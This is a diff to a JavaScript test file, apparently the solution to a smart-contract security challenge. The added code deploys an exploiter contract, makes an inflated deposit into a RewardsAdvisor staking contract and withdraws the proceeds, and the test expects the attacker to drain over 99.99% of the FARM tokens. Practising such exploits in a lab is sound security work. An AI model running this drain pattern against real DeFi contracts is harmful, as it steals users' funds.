@@ -49,14 +49,35 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  let pwnFactory = await ethers.getContractFactory('RewardsAdvisorExploiter');
+  let pwner = await pwnFactory.connect(attacker).deploy(rewardsAdvisor.address, govToken.address);
 
+  let overallBalance = await farm.totalSupply();
+  let goverallBalance = await govToken.totalSupply();
+
+  console.log(`Overall  ${overallBalance}`)
+  console.log(`Goverallb ${goverallBalance}`)
+  const loopCount = 1;
+  for (let index = 0; index < loopCount; index++) {
+    
+    await rewardsAdvisor.connect(attacker).deposit(overallBalance.mul(69696), pwner.address, pwner.address)
+  }
+  let overallBalance2 = await farm.totalSupply();
+  let goverallBalance2 = await govToken.totalSupply();
+  console.log(`Overall  ${overallBalance2}`)
+  console.log(`Goverallb ${goverallBalance2}`)
+  let balance = await farm.balanceOf(pwner.address);
+  let gbalance = await govToken.balanceOf(pwner.address);
+  console.log(`${balance}`);
+  console.log(`${gbalance}`);
+  await rewardsAdvisor.connect(attacker).withdraw(gbalance, await attacker.getAddress(), pwner.address);
 });
 
 /// expected final state
 after(async () => {
 
   // attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
-  expect(await farm.balanceOf(await attacker.getAddress())).to.be.gte(precision.mul(10_000))
-  expect(await farm.balanceOf(rewardsAdvisor.address)).to.be.lte(precision.mul(1))
+  expect(await farm.balanceOf(await attacker.getAddress())).to.be.gte(precision.mul(10_000), 'Attacker Stole Funds!')
+  expect(await farm.balanceOf(rewardsAdvisor.address)).to.be.lte(precision.mul(1), 'Attacker drained contract.')
 
 });
